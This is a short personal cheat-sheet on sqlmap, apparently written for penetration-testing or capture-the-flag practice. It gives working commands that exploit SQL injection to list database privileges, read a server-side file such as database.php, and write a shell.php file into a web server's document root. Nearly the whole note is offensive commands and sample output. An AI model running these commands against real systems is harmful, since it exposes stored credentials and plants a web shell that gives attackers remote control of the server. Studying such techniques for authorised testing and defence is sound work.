# Sqlmap

This is note by manesec.

## File

**Check permission**

```bash
sqlmap -r header-req --current-user --privileges
    privilege: ALTER                                                                                                                                                     
    privilege: ALTER ROUTINE                                                                                                                                             
    privilege: CREATE                                                                                                                                                    
    privilege: CREATE ROUTINE                                                                                                                                            
    privilege: CREATE TABLESPACE                                                                                                                                         
    privilege: CREATE TEMPORARY TABLES                                                                                                                                   
    privilege: CREATE USER                                                                                                                                               
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DELETE HISTORY
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    ** privilege: FILE **
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
```

**Read File**

```bash
sqlmap -r header-req --file-read=C:\\inetpub\\wwwroot\\database.php
```

**Write File**

```bash
sqlmap -r header-req --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
```

# Reference

[SQLMap read file on the server &#8211; Cyber Security Architect | Red/Blue Teaming | Exploit/Malware Analysis](https://rioasmara.com/2020/05/25/sqlmap-read-file-on-the-server/)


